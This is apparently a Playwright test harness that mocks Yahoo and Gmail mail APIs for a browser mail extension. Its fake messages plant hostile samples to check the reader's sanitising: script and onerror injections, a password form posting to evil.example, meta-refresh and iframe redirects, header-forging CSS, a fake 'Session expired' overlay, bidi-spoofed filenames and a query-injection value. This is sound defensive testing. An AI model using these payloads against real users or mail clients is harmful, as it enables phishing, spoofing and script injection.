// Mocked mail services for the browser suites: launches Chromium with the real extension, answers
// every endpoint the app uses from invented mail, and refuses every other host. launch() builds
// and loads the Yahoo extension against a mocked Yahoo; launch({ provider: "gmail" }) the Gmail
// extension against the Gmail of gmail-mock.js.
const { chromium } = require("playwright");
const path = require("path");
const fs = require("fs");
const os = require("os");
const { createGmail } = require("./gmail-mock.js");
const { build, EDITIONS, ROOT } = require("./build.js");

// edition -> its folder, built once per run without the edition's local.json and into out/test/,
// so every machine tests the same extension and the copy a browser has loaded from dist/ is left alone
const built = {};
const buildForTest = edition => build(edition, { local: {}, to: path.join(ROOT, "out", "test", EDITIONS[edition].folder) });
const now = Math.floor(Date.now() / 1000);
// Every third message has a file, named in its list row as Yahoo names one (part, size, type,
// links, content id); message 6 also carries a nameless logo Yahoo counts as an attachment.
// Message 4 has only images built into its body, which are not files.
// Projects/FPGA (32) carries bidi controls in its names, subjects and filenames.
const RLO = "\u202E", PDF = "\u202C", RLI = "\u2067", PDI = "\u2069";
const msg = (i, folder) => folder === "32" ? spoofed(plainMsg(i, folder)) : plainMsg(i, folder);
const spoofed = m => ({ ...m, headers: { ...m.headers, subject: `Pay ${RLO}eulav${PDF} ${m.id.split("_")[1]}`, from: [{ name: `Bob${RLI}evil${PDI}`, email: m.headers.from[0].email }] } });
const plainMsg = (i, folder) => ({ id: `MSG${folder}_${i}`, conversationId: String(4000 + i), modSeq: i, size: 1000, csid: `csid${i}`,
  attachmentCount: i % 3 === 0 ? 1 : i === 4 ? 2 : 0,
  attachments: i % 3 === 0 ? [{ partId: "2", disposition: "attachment", filename: "f.pdf", size: 52000, type: "application", subtype: "pdf", objectId: `OBJ${folder}_${i}`, downloadUrl: "https://cloud-apis.mail.yahoo.com/dl/pdf" },
    ...(i === 6 ? [{ partId: "9", disposition: "attachment", filename: "", size: 2109, type: "image", subtype: "png", objectId: "LOGO", downloadUrl: "https://cloud-apis.mail.yahoo.com/dl/png" }] : [])]
    : i === 4 ? [{ disposition: "inline" }, { disposition: "inline" }] : [],
  flags: { read: i % 2 === 0, flagged: false },
  headers: { subject: `Subject ${folder}-${i}`, from: [{ name: `Sender ${i}`, email: `s${i}@x.com` }], to: [{ name: "Me", email: "me@yahoo.com" }], cc: [{ name: "Other", email: "o@x.com" }], date: String(now - i * 40000) },
  folder: { id: folder, name: folder === "1" ? "Inbox" : "Other" }, snippet: "snip" });
const FOLDERS = [
  { id: "1", name: "Inbox", types: ["INBOX"], unread: 3, total: 10, highestModSeq: 10 },
  { id: "3", name: "Draft", types: ["DRAFT"], unread: 0, total: 1, highestModSeq: 11 },
  { id: "2", name: "Sent", types: ["SENT"], unread: 0, total: 8, highestModSeq: 11 },
  { id: "4", name: "Trash", types: ["TRASH"], unread: 0, total: 1, highestModSeq: 12 },
  { id: "62", name: "Archive", types: ["ARCHIVE"], unread: 0, total: 0, highestModSeq: 16 },
  { id: "6", name: "Bulk", types: ["BULK"], unread: 0, total: 2, highestModSeq: 17 },
  { id: "31", name: "Projects", types: ["USER"], unread: 0, total: 5, highestModSeq: 13 },
  { id: "32", name: "Projects/FPGA", types: ["USER"], unread: 0, total: 3, highestModSeq: 14 },
  { id: "40", name: "Travel", types: ["USER"], unread: 0, total: 0, highestModSeq: 18 },
  { id: "41", name: "Travel/2025", types: ["USER"], unread: 0, total: 12, highestModSeq: 19 },
];
const accounts = [{ id: "1", email: "me@yahoo.com", sendingName: "Me Myself", isPrimary: true, isSending: true, type: "FREE", signature: "<i>sig</i>", signatureActive: true }];


async function launch(opts = {}) {
  const provider = opts.provider || "yahoo";
  const ext = built[provider] ||= buildForTest(provider);
  const profile = fs.mkdtempSync(path.join(os.tmpdir(), "baltazar-mail-profile-"));
  // No host outside the mocks resolves, so nothing can reach the real network. Focus that a
  // cross-origin frame (the sandboxed preview) takes without a click in it is blocked, as the
  // browsers the extension runs in block it; the build the tests use allows it otherwise.
  const ctx = await chromium.launchPersistentContext(profile, { channel: "chromium", headless: true,
    args: [`--disable-extensions-except=${ext}`, `--load-extension=${ext}`, "--no-proxy-server", "--host-resolver-rules=MAP * ~NOTFOUND, EXCLUDE 127.0.0.1",
      "--enable-blink-features=BlockingFocusWithoutUserActivation"] });
  const sw = ctx.serviceWorkers()[0] || await ctx.waitForEvent("serviceworker");
  const extId = new URL(sw.url()).host;
  // The Gmail extension opens its mail tab when it is first installed, before any route here is
  // set: that tab is closed and what it stored forgotten, so a suite starts from an install that
  // was never opened. firstRun counts the tabs it opened.
  let firstRun = 0;
  if (provider === "gmail") {
    const mailPage = `chrome-extension://${extId}/mail.html`;
    for (let i = 0; i < 100 && !firstRun; i++) {
      for (const p of ctx.pages().filter(p => p.url().startsWith(mailPage))) { await p.close(); firstRun++; }
      if (!firstRun) await new Promise(r => setTimeout(r, 100));
    }
    await sw.evaluate(() => Promise.all([chrome.storage.local.clear(), chrome.storage.session.clear()]));
  }
  // Requests to hosts without a mock are recorded and refused (later routes take precedence).
  const unexpectedHosts = new Set();
  await ctx.route(/^https?:\/\//, r => { unexpectedHosts.add(new URL(r.request().url()).hostname); return r.abort(); });
  const calls = [], docCalls = [];
  // Knobs a test turns to provoke server behaviour. patchRaw(source) edits message sources. offline refuses every Yahoo request. patchBody(id, message, simpleBody) edits a
  // message body before it is answered. handler({ name, envelope, top, uri, post, req })
  // may answer a batch call itself: return { responses } or { error }, or nothing to fall through.
  const mock = { failSaves: 0, failMoves: 0, listDelay: 0, failSends: 0, hiddenFetched: false, convFail: false, deckBinary: false, thumbFull: false, handler: null, patchBody: null, patchRaw: null, offline: false, probes: [], images: [], parts: [], flags: new Map(), ...opts.mock };
  const folders = structuredClone(FOLDERS);
  const goneElsewhere = new Set();   // messages another device removed; list queries leave them out
  // GitHub's release API, asked once a day for the newest version
  const ghCalls = [];
  await ctx.route("https://api.github.com/**", route => {
    ghCalls.push({ url: route.request().url(), cookie: route.request().headers().cookie || "" });
    return route.fulfill({ contentType: "application/json", headers: { "access-control-allow-origin": "*" }, body: JSON.stringify({ tag_name: "v99.0.0" }) });
  });
  await ctx.route("https://ecp.yusercontent.com/**", route => (mock.images.push({ url: route.request().url(), from: route.request().frame()?.url() || "" }), route.fulfill({ contentType: "image/png", body: Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAIAAAACCAYAAABytg0kAAAAEklEQVR42mP8z8DwHwAFBQIAX8jx0gAAAABJRU5ErkJggg==", "base64") })));
  await ctx.route("https://mail.yahoo.com/**", async route => {
    const req = route.request();
    if (mock.offline) return route.abort("internetdisconnected");
    // probe addresses planted in test mail: any request for one is a leak with the user's cookies
    if (req.url().includes("/probe-")) { mock.probes.push({ url: req.url(), from: req.frame()?.url() || "", cookie: !!req.headers().cookie }); return route.fulfill({ status: 404, body: "" }); }
    if (req.url().includes("hidden-in-alt")) mock.hiddenFetched = true;
    if (req.url() === "https://mail.yahoo.com/") return route.fulfill({ contentType: "text/html", body: '<html><script>window.AppBootstrapData={"appId":"YMailCLDNovation","mailWssid":"w1","primaryMailbox":{"email":"me@yahoo.com","id":"MB1"}}</script></html>' });
    const name = new URL(req.url()).searchParams.get("name");
    const post = req.postData() || "";
    const headers = req.headers();
    const jsonM = post.match(/name="batchJson"\r\n\r\n([\s\S]*?)\r\n--/);
    const envelope = jsonM ? JSON.parse(jsonM[1]) : null;
    const fileParts = [...post.matchAll(/name="([^"]+)"; filename="([^"]+)"/g)].map(m => [m[1], m[2]]);
    // each uploaded PNG's width, from its IHDR chunk, by file name
    const bin = (req.postDataBuffer() || Buffer.alloc(0)).toString("latin1");
    const pngWidths = Object.fromEntries([...bin.matchAll(/filename="([^"]+)"[^\r\n]*(?:\r\n[^\r\n]+)*\r\n\r\n\x89PNG/g)].map(m => [m[1], Buffer.from(bin.slice(m.index + m[0].length + 12, m.index + m[0].length + 16), "latin1").readUInt32BE(0)]));
    calls.push({ name, origin: headers.origin, envelope, fileParts, pngWidths });
    const top = envelope?.requests?.[0] || {};
    const uri = top.uri || "";
    if (name === "messageGroups.getList" && mock.listDelay) await new Promise(r => setTimeout(r, mock.listDelay));
    if (name === "messages.saveAndSend" && mock.failSends > 0) {
      mock.failSends--;
      return route.fulfill({ contentType: "application/json", body: JSON.stringify({ error: { code: "EC-5003", message: "Internal error" } }) });
    }
    if (name === "messages.move" && mock.failMoves > 0) {
      mock.failMoves--;
      return route.fulfill({ contentType: "application/json", body: JSON.stringify({ error: { code: "EC-5003", message: "Internal error" } }) });
    }
    if (name === "messages.saveV3" && mock.failSaves > 0) {
      mock.failSaves--;
      return route.fulfill({ contentType: "application/json", body: JSON.stringify({ error: { code: "ES-5000", message: "save failed" } }) });
    }
    if (mock.handler) {
      const own = await mock.handler({ name, envelope, top, uri, post, req });
      if (own?.error) return route.fulfill({ contentType: "application/json", body: JSON.stringify({ error: own.error }) });
      if (own?.responses) return route.fulfill({ contentType: "application/json", body: JSON.stringify({ result: { responses: own.responses, status: {} }, error: null }) });
    }
    let responses;
    if (uri.endsWith("/folders")) responses = [{ id: top.id, httpCode: 200, response: { result: { folders, accounts: [] } } }];
    else if (uri.endsWith("/accounts")) responses = [{ id: top.id, httpCode: 200, response: { result: { accounts } } }];
    else if (uri.includes("/content/simplebody/full")) {
      const id = uri.match(/@\.id==(MSG[^/]+)/)[1];
      // a message that no longer exists, as Yahoo answers it
      if (goneElsewhere.has(id)) return route.fulfill({ contentType: "application/json", body: JSON.stringify({ result: { responses: [{ id: top.id, httpCode: 404, response: { error: { code: "EC-4007" } } }], status: {} }, error: null }) });
      const message = msg(Number(id.split("_")[1]), id.split("_")[0].slice(3));
      message.attachments = [
        { partId: "2", filename: "report.pdf", size: 52000, disposition: "attachment", type: "application", subtype: "pdf", contentId: "<rep@x>", downloadUrl: "https://cloud-apis.mail.yahoo.com/dl/pdf", textExtractionUrl: "https://cloud-apis.mail.yahoo.com/text/2?appid=x" },
        { partId: "3", filename: "data.csv", size: 900, disposition: "attachment", type: "text", subtype: "csv", downloadUrl: "https://cloud-apis.mail.yahoo.com/dl/csv", textExtractionUrl: "https://cloud-apis.mail.yahoo.com/text/3?appid=x" },
        { partId: "4", filename: "src.zip", size: 400, disposition: "attachment", type: "application", subtype: "zip", downloadUrl: "https://cloud-apis.mail.yahoo.com/dl/zip" },
        { partId: "5", filename: "photo.png", size: 70, disposition: "attachment", type: "image", subtype: "png", downloadUrl: "https://cloud-apis.mail.yahoo.com/dl/png", thumbnailUrl: "https://cloud-apis.mail.yahoo.com/thumb/5?appid=x" },
        { partId: "6", filename: "cv.docx", size: 33000, disposition: "attachment", type: "application", subtype: "vnd.openxmlformats-officedocument.wordprocessingml.document", downloadUrl: "https://cloud-apis.mail.yahoo.com/dl/docx", textExtractionUrl: "https://cloud-apis.mail.yahoo.com/text/6?appid=x" },
        { partId: "7", filename: "budget.xlsx", size: 17000, disposition: "attachment", type: "application", subtype: "vnd.openxmlformats-officedocument.spreadsheetml.sheet", downloadUrl: "https://cloud-apis.mail.yahoo.com/dl/xlsx" },
        { partId: "8", filename: "deck.pptx", size: 90000, disposition: "attachment", type: "application", subtype: "vnd.openxmlformats-officedocument.presentationml.presentation", downloadUrl: "https://cloud-apis.mail.yahoo.com/dl/pptx", documentId: "DOC8" },
      ];
      if (id.startsWith("MSG32_")) message.attachments[2].filename = `inv${RLO}fdp.exe`;
      // a draft whose reply reference is not a message id: it must not reach a query
      if (id.startsWith("MSG3_")) message.inReplyTo = { messageReference: { id: "X) OR id:(Y" }, replied: true };
      // One inline image in Yahoo's real part-thumbnail shape, which must be inlined, and one address
      // hidden in an alt attribute, which must never be requested.
      // Part 5 is one Yahoo cannot render (EP-5001); it is cut out of the message source instead.
      const inline = `<img src="https://cloud-apis.mail.yahoo.com/ws/v3/mailboxes/@.id==MB1/messages/@.id==${id}/content/parts/@.id==2/thumbnail&amp;appid=x&amp;pid=2">` +
        `<img src="https://cloud-apis.mail.yahoo.com/ws/v3/mailboxes/@.id==MB1/messages/@.id==${id}/content/parts/@.id==5/thumbnail&amp;appid=x&amp;pid=5">` +
        `<img alt="x src='https://mail.yahoo.com/ws/v3/hidden-in-alt'" src="https://ecp.yusercontent.com/p.png">` +
        // a layout spacer: a square PNG stretched by CSS, kept one pixel tall by its attributes
        `<img id="spacer" style="min-width:640px;min-height:1px" width="640" height="1" src="data:image/png;base64,${thumbPng.toString("base64")}">`;
      // a white card with dark text, which the dark reader turns into a dark card with light text
      const card = `<div id="paper" style="background-color:#ffffff;color:#333333">Card</div>`;
      // Drafts also carry a quote a hostile sender could plant: a box over the whole window, a
      // data: URL that is not an image, and one that does not decode.
      // Projects messages carry what the reader's cleaning must remove or neutralise.
      const unsafe = id.startsWith("MSG31_") ? `<script>parent.pwned = 1</script><img id="h-img" src="data:," onerror="parent.pwned = 1">` +
        `<form id="h-form" action="https://evil.example/"><input id="h-input" name="pw"><button>Go</button></form>` +
        `<a id="h-link" href="https://evil.example/" ping="https://evil.example/ping" target="_top">link</a>` +
        `<img src="data:," usemap="#m"><map name="m"><area id="h-area" href="https://evil.example/" target="_self" shape="rect" coords="0,0,9,9"></map>` +
        `<svg><a id="h-svga" href="https://evil.example/" target="_self"><text y="9">x</text></a></svg>` +
        `<meta http-equiv="refresh" content="0;url=https://evil.example/"><iframe id="h-frame" src="https://evil.example/"></iframe>` +
        `<object id="h-obj" data="https://evil.example/x"></object><svg id="h-svg" onload="parent.pwned = 1"><circle r="1"/></svg>` : "";
      // Every message tries to hide or cover the printed header, also by moving its own box (:host).
      const forge = id.startsWith("MSG3_") ? "" : `<style>.hdr, .hdr * { display: none !important }</style><style>:host{position:relative!important;top:-150px!important;z-index:9!important;background:#fff!important;display:block!important}</style>` +
        `<div id="forge" style="position:fixed;top:0;left:0;width:100%;height:160px;background:#fff;z-index:9">Fake header</div>`;
      const hostile = id.startsWith("MSG3_") ? `<div id="overlay" style="position:fixed;inset:0;z-index:2147483647;background:#f00">Session expired</div>` +
        `<img src="data:text/html;base64,PGgxPmhpPC9oMT4=">` + `<img src="data:image/png;base64,@@not base64@@">` : "";
      const simpleBody = { html: `<p>Body of <b>${id}</b></p>${inline}${card}${hostile}${unsafe}${forge}` };
      if (mock.patchBody) mock.patchBody(id, message, simpleBody);   // a test's own message
      responses = [{ id: top.id, httpCode: 200, response: { result: { message, simpleBody } } }];
    }
    else if (uri === "/ws/docpreview/v2/fetch") {
      // Yahoo's converter: first ask is still queued, then pages arrive entity-encoded.
      docCalls.push({ docId: headers["docs-document-id"], ...top.payload });
      const enc = s => s.replace(/[<>"&=#;:/ ]/g, c => `&#${c.charCodeAt(0)};`);
      const pages = {};
      if (top.payload.retryCount > 0 && !mock.convFail) for (let n = top.payload.start_page; n <= Math.min(5, top.payload.end_page); n++)
        pages["page" + n] = { html: enc(`<div class="aps-page"><p class="t">Slide ${n === 1 ? "one" : n}</p><script>bad()</script><a href="javascript:bad()">x</a></div>`), css: `.aps-page .t { font-size: 20pt; } </sty</style>le><img id="css-escape" src="data:,">`, statuscode: 700, pdfEmbed: false };
      responses = [{ id: top.id, httpCode: 200, response: Object.keys(pages).length ? { code: 800, statuscode: 600, info: { num_pages: 5, dimension: { w: 900, h: 1400 } }, pages } : { code: mock.convFail ? 813 : 814, statuscode: 600, pages: {} } }];
    }
    else if (top.id === "SaveMessage") {
      const saved = { ...msg(99, "3"), id: "MSGDRAFT_99", immutableid: "IMM99", csid: top.payloadParts[0].payload.message.csid };
      responses = [{ id: "SaveMessage", httpCode: 200, response: { result: { message: saved, simpleBody: {} } } }];
      for (const r of top.requests || []) responses.push({ id: r.id, httpCode: 200, response: { result: { message: saved } } });
    }
    else if (/"method":"(POST|DELETE)"/.test(post)) {
      // flag changes are remembered, as the server would, and show in later lists
      for (const q of envelope?.requests || []) {
        const id = decodeURIComponent(q.uri || "").match(/id:\(([^)]+)\)/)?.[1], f = q.payload?.message?.flags;
        if (id && f) mock.flags.set(id, { ...mock.flags.get(id), ...f });
        if (id && q.method === "DELETE") goneElsewhere.add(id);   // deleted for good, as on the server
      }
      responses = [...post.matchAll(/"id":"((?:UnifiedUpdateMessage|UnifiedDeleteMessage)_\d+)"/g)].map(m => ({ id: m[1], httpCode: 204 })); }
    else { const q = decodeURIComponent(uri.split("q=")[1] || ""); const folder = (q.match(/folderId:(\d+)/) || [])[1] || "1"; const empty = /(^|[^-])folderId:(62|40)\b/.test(q); responses = [{ id: top.id, httpCode: 200, response: { result: { messages: empty ? [] : Array.from({ length: 8 }, (_, i) => msg(i + 1, folder)).filter(m => !goneElsewhere.has(m.id)).map(m => mock.flags.has(m.id) ? { ...m, flags: { ...m.flags, ...mock.flags.get(m.id) } } : m).filter(m => !/\bis:unread\b/.test(q) || !m.flags?.read).filter(m => !/(^|[\s(])has:attachment\b/.test(q) || m.attachments.some(a => a.disposition !== "inline")), query: {} } } }]; }
    return route.fulfill({ contentType: "application/json", body: JSON.stringify({ result: { responses, status: {} }, error: null }) });
  });

  // Raw message source holding the real attachment bytes, numbered as Yahoo numbers them.
  const FX = path.join(__dirname, "fixtures");
  const b64 = buf => buf.toString("base64").replace(/.{76}/g, "$&\r\n");
  const part = (type, name, buf) => `--BOUND\r\nContent-Type: ${type}; name="${name}"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename="${name}"\r\n\r\n${b64(buf)}\r\n`;
  const rawFor = () => "From: s@x.com\r\nSubject: test\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\"BOUND\"\r\n\r\npreamble\r\n" +
    "--BOUND\r\nContent-Type: text/plain\r\n\r\nBody\r\n" +
    part("application/pdf", "report.pdf", fs.readFileSync(path.join(FX, "report.pdf"))) +
    part("text/csv", "data.csv", Buffer.from("name,qty\nZ80,2\n6502,1\n")) +
    part("application/zip", "src.zip", zipBytes) +
    part("image/png", "photo.png", thumbPng) +
    part("application/octet-stream", "cv.docx", fs.readFileSync(path.join(FX, "cv.docx"))) +
    part("application/octet-stream", "budget.xlsx", fs.readFileSync(path.join(FX, "budget.xlsx"))) +
    part("application/octet-stream", "deck.pptx", mock.deckBinary ? Buffer.from([0x50, 0x4b, 3, 4, 0x14, 0, 0, 0, 0x41, 0x42]) : Buffer.from("not really a deck")) + "--BOUND--\r\n";
  const rawCalls = [];
  await ctx.route("https://apis.mail.yahoo.com/**", route => {
    const u = route.request().url();
    rawCalls.push({ url: u, origin: route.request().headers().origin });
    if (u.includes("/content/rawplaintext")) return route.fulfill({ contentType: "text/plain", body: mock.patchRaw ? mock.patchRaw(rawFor()) : rawFor() });
    return route.fulfill({ status: 404, body: "" });
  });
  const thumbPng = Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAIAAAACCAYAAABytg0kAAAAEklEQVR42mP8z8DwHwAFBQIAX8jx0gAAAABJRU5ErkJggg==", "base64");
  const zipBytes = Buffer.from("UEsDBBQAAAAAAI8CX12Tpho8uAEAALgBAAAKAAAAc3JjL21haW4uY2ludCBtYWluKCl7cmV0dXJuIDA7fQppbnQgbWFpbigpe3JldHVybiAwO30KaW50IG1haW4oKXtyZXR1cm4gMDt9CmludCBtYWluKCl7cmV0dXJuIDA7fQppbnQgbWFpbigpe3JldHVybiAwO30KaW50IG1haW4oKXtyZXR1cm4gMDt9CmludCBtYWluKCl7cmV0dXJuIDA7fQppbnQgbWFpbigpe3JldHVybiAwO30KaW50IG1haW4oKXtyZXR1cm4gMDt9CmludCBtYWluKCl7cmV0dXJuIDA7fQppbnQgbWFpbigpe3JldHVybiAwO30KaW50IG1haW4oKXtyZXR1cm4gMDt9CmludCBtYWluKCl7cmV0dXJuIDA7fQppbnQgbWFpbigpe3JldHVybiAwO30KaW50IG1haW4oKXtyZXR1cm4gMDt9CmludCBtYWluKCl7cmV0dXJuIDA7fQppbnQgbWFpbigpe3JldHVybiAwO30KaW50IG1haW4oKXtyZXR1cm4gMDt9CmludCBtYWluKCl7cmV0dXJuIDA7fQppbnQgbWFpbigpe3JldHVybiAwO30KUEsDBBQAAAAAAI8CX10gMDo2BgAAAAYAAAAJAAAAUkVBRE1FLm1kaGVsbG8KUEsBAhQDFAAAAAAAjwJfXZOmGjy4AQAAuAEAAAoAAAAAAAAAAAAAAIABAAAAAHNyYy9tYWluLmNQSwECFAMUAAAAAACPAl9dIDA6NgYAAAAGAAAACQAAAAAAAAAAAAAAgAHgAQAAUkVBRE1FLm1kUEsFBgAAAAACAAIAbwAAAA0CAAAAAA==", "base64");
  await ctx.route("https://cloud-apis.mail.yahoo.com/**", route => {
    const u = route.request().url();
    if (u.includes("/content/parts/")) mock.parts.push(u);
    if (u.includes("/probe-")) { mock.probes.push({ url: u, from: route.request().frame()?.url() || "", cookie: !!route.request().headers().cookie }); return route.fulfill({ status: 404, body: "" }); }
    // Yahoo's download links cannot be fetched (redirect the page cannot follow), as in production.
    if (u.includes("/dl/")) return route.abort("failed");
    if (u.includes("/text/3")) return route.fulfill({ contentType: "application/json", body: JSON.stringify({ result: { textExtractResult: "name,qty\nZ80,2\n6502,1\n" } }) });
    if (u.includes("/text/2")) return route.fulfill({ contentType: "application/json", body: JSON.stringify({ result: { textExtractResult: "Quarterly report\nPage 1" } }) });
    if (u.includes("/text/")) return route.fulfill({ contentType: "application/json", body: JSON.stringify({ result: { textExtractResult: "Jorge Ruiz\nEngineer" } }) });
    if (u.includes("/parts/@.id==5/thumbnail")) return route.fulfill({ status: 501, contentType: "application/json", body: '{"error":{"code":"EP-5001"}}' });
    if (u.includes("/thumb/") && u.includes("size=2048w")) mock.thumbFull = true;
    return route.fulfill({ contentType: "image/png", body: thumbPng });
  });
  // The Gmail extension: the API answered by gmail-mock.js, with the token the app would have got
  // from Google planted by signIn() (the sign-in window itself is out of reach of a test, so the
  // first load shows the sign-in page). The window of a sign-in flow is opened by the browser
  // outside the pages routed here, where no host resolves, so a flow fails at once; each one the
  // page starts is noted before it goes (gmail.signIns: its prompt, client and redirect address),
  // as is any request of the page's own to Google's sign-in host, so a sign-in the app started by
  // itself is seen. A test may answer the next flow itself instead (gmail.flowAnswer: { reject:
  // the browser's message } or { fragment: Google's answer }). Pages of Google's console, which
  // the setup guide links to, are answered with an empty page and noted (gmail.consolePages).
  let gmail = null;
  const signIn = async () => {
    await page.evaluate(() => chrome.storage.session.set({ gmToken: { access_token: "test", expires: Date.now() + 3600e3, email: "me@gmail.com" } }));
    await page.reload();
  };
  if (provider === "gmail") {
    const gm = createGmail(opts.gmail);
    gmail = gm.state;
    await ctx.route("https://gmail.googleapis.com/**", async route => {
      const req = route.request();
      if (mock.offline) return route.abort("internetdisconnected");
      if (gmail.listDelay && req.url().includes("/messages?")) await new Promise(r => setTimeout(r, gmail.listDelay));
      const body = req.postDataBuffer()?.toString("latin1") ?? null;
      const r = gm.respond(req.method(), req.url(), body, req.headers());
      if (r.text != null) return route.fulfill({ status: r.status, contentType: r.contentType, body: r.text });
      return route.fulfill({ status: r.status, contentType: "application/json", body: r.json == null ? "" : JSON.stringify(r.json) });
    });
    await ctx.route("https://oauth2.googleapis.com/**", route => { gmail.calls.push({ method: route.request().method(), path: new URL(route.request().url()).pathname }); return route.fulfill({ status: 200, body: "" }); });
    await ctx.route("https://accounts.google.com/**", route => { gmail.signIns.push({ prompt: new URL(route.request().url()).searchParams.get("prompt"), how: "request" }); return route.fulfill({ status: 500, body: "no sign-in window in a test" }); });
    gmail.flowAnswer = null;
    gmail.consolePages = [];
    await ctx.route("https://console.cloud.google.com/**", route => { gmail.consolePages.push(route.request().url()); return route.fulfill({ contentType: "text/html", body: "<!doctype html><title>Google Cloud console</title>" }); });
    await ctx.exposeBinding("noteSignInFlow", (source, flow) => { gmail.signIns.push({ ...flow, how: "flow" }); const a = gmail.flowAnswer; gmail.flowAnswer = null; return a; });
    await ctx.addInitScript(() => {
      const identity = globalThis.chrome?.identity;
      if (!identity?.launchWebAuthFlow || !globalThis.noteSignInFlow) return;
      const launch = identity.launchWebAuthFlow.bind(identity);
      // the test build carries no client of its own, so the client noted is the one the test gave
      const param = (url, k) => { try { return new URL(url).searchParams.get(k); } catch { return null; } };
      identity.launchWebAuthFlow = async details => {
        const url = details?.url;
        const answer = await globalThis.noteSignInFlow({ prompt: param(url, "prompt"), client: param(url, "client_id"), redirect: param(url, "redirect_uri"), interactive: !!details?.interactive });
        if (answer?.reject) throw new Error(answer.reject);
        if (answer?.fragment) return `${param(url, "redirect_uri")}#${answer.fragment}&state=${param(url, "state")}`;
        return launch(details);
      };
    });
    // A sender's image host, for mail that shows a remote picture: what was asked for, by which
    // frame and with what referrer.
    await ctx.route("https://img.example/**", route => {
      const req = route.request();
      gmail.images.push({ url: req.url(), from: req.frame()?.url() || "", referer: req.headers().referer || "" });
      return route.fulfill({ contentType: "image/png", body: thumbPng });
    });
  }
  const page = await ctx.newPage();
  const errors = [];
  page.on("pageerror", e => errors.push("pageerror: " + e.message));
  const cspViolations = [];
  const onConsole = m => {
    const t = m.text();
    // The sandboxed reader frame's request for Yahoo's image proxy cannot be intercepted by
    // Playwright, and this test machine has no internet; that one load failing is expected.
    if (/^https:\/\/ecp\.yusercontent\.com\//.test(m.location()?.url || "") && /ERR_TUNNEL|ERR_NAME|ERR_PROXY/.test(t)) return;
    // The inline part Yahoo cannot render answers 501, as in production; the browser logs it.
    if (/\/parts\/@\.id==5\/thumbnail/.test(m.location()?.url || "") && /status of 501/.test(t)) return;
    // Gmail's profile answers 403 for a project with the Gmail API off, which the setup guide's
    // test provokes on purpose; the browser logs it.
    if (/\/gmail\/v1\/users\/me\/profile$/.test(m.location()?.url || "") && /status of 403/.test(t)) return;
    // Playwright adds its own listeners to a frame it has looked into; in the reader frame, where
    // no script may run, the browser blocks them and says so on every click and key.
    if (/^about:srcdoc/.test(m.location()?.url || "") && t.includes("the 'allow-scripts' permission is not set")) return;
    if (/Content Security Policy|violates the following/.test(t)) cspViolations.push(`${(m.location()?.url || "").replace(/^chrome-extension:\/\/[^/]+\//, "")}: ${t.slice(0, 220)}`);
    // EC-5003 is the error the failed-archive step provokes on purpose; the app logs it
    else if (m.type() === "error" && !t.includes("net::ERR_FAILED") && !t.includes('"code":"EC-5003"')) errors.push("console: " + t.slice(0, 200));
  };
  page.on("console", onConsole);
  const open = async () => page.goto(`chrome-extension://${extId}/mail.html`);
  const close = async () => { await ctx.close(); fs.rmSync(profile, { recursive: true, force: true }); };
  return { ctx, page, extId, profile, calls, docCalls, rawCalls, ghCalls, mock, folders, goneElsewhere, errors, cspViolations, unexpectedHosts, open, close, FX, thumbPng, provider, gmail, signIn, firstRun };
}

// A runtime suite that stops making progress is ended, naming the line of the suite it was
// waiting on, long before CI's job limit would end it without a word. Every call the suite (file)
// makes on a page, frame, locator, keyboard, mouse or the context notes the line it came from;
// once none has been made for `minutes`, the browser is closed and the process ends.
function watchdog(h, file, minutes = 3) {
  let where = "before its first step", since = Date.now();
  const note = () => {
    const line = new Error().stack.split("\n").find(l => l.includes(file));
    if (line) { where = line.trim().replace(/^at\s+/, ""); since = Date.now(); }
  };
  const { page, ctx } = h;
  for (const proto of new Set([page, page.mainFrame(), page.locator("body"), page.frameLocator("body"), page.keyboard, page.mouse, ctx].map(Object.getPrototypeOf))) {
    for (const name of Object.getOwnPropertyNames(proto)) {
      const fn = Object.getOwnPropertyDescriptor(proto, name).value;
      if (name === "constructor" || name === "then" || name.startsWith("_") || typeof fn !== "function") continue;
      proto[name] = function (...args) { note(); return fn.apply(this, args); };
    }
  }
  const timer = setInterval(() => {
    if (Date.now() - since < minutes * 60000) return;
    clearInterval(timer);
    console.error(`STUCK: no step for ${minutes} minutes; waiting at ${where}`);
    Promise.race([h.close(), new Promise(r => setTimeout(r, 10000))]).finally(() => process.exit(1));
  }, 5000);
  timer.unref();
}

// A key for the attachment viewer, dispatched in the mail page as a keydown. A preview frame takes
// the focus once it has drawn, and Playwright's own press waits for the key's release to reach that
// frame, which the key itself removes (Esc closes the viewer, an arrow shows the next file): such a
// press never returns. Whether the frame has drawn yet is a matter of timing, so every key the
// viewer is sent while a preview may be on screen goes this way.
const viewerKey = (page, key) => page.evaluate(k => document.dispatchEvent(new KeyboardEvent("keydown", { key: k, bubbles: true })), key);

module.exports = { launch, msg, accounts, now, buildForTest, watchdog, viewerKey };
